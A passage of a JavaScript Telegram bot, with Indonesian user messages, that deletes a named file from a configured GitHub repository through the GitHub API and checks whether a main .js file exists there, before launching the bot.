      return ctx.reply(`⚠️ File **${fileName}** tidak ditemukan di GitHub.`);
    }

    const data = await res.json();

    const del = await fetch(apiURL, {
      method: "DELETE",
      headers: {
        "Authorization": `token ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot"
      },
      body: JSON.stringify({
        message: `Delete ${fileName} via bot`,
        sha: data.sha,
        branch: GITHUB_BRANCH
      })
    });

    if (!del.ok) return ctx.reply("❌ Gagal menghapus file di GitHub.");

    ctx.reply(`🗑️ File **${fileName}** berhasil dihapus dari GitHub!`);

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Error saat menghapus file.");
  }
});

bot.command("cekfile", async (ctx) => {
  const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents?ref=${GITHUB_BRANCH}`;

  try {
    const res = await fetch(apiURL, {
      headers: {
        "User-Agent": "Telegram-Bot",
        "Accept": "application/vnd.github.v3+json"
      }
    });

    if (!res.ok) return ctx.reply("❌ Tidak dapat mengakses GitHub.");

    const files = await res.json();
    const target = files.find(f =>
      f.name.toLowerCase().includes("main") && f.name.endsWith(".js")
    );

    if (!target) return ctx.reply("❌ File *main.js* tidak ditemukan di GitHub.");

    ctx.reply(`✅ File ditemukan di GitHub:\n📄 *${target.name}*`, {
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error cek file.");
  }
});


bot.launch()



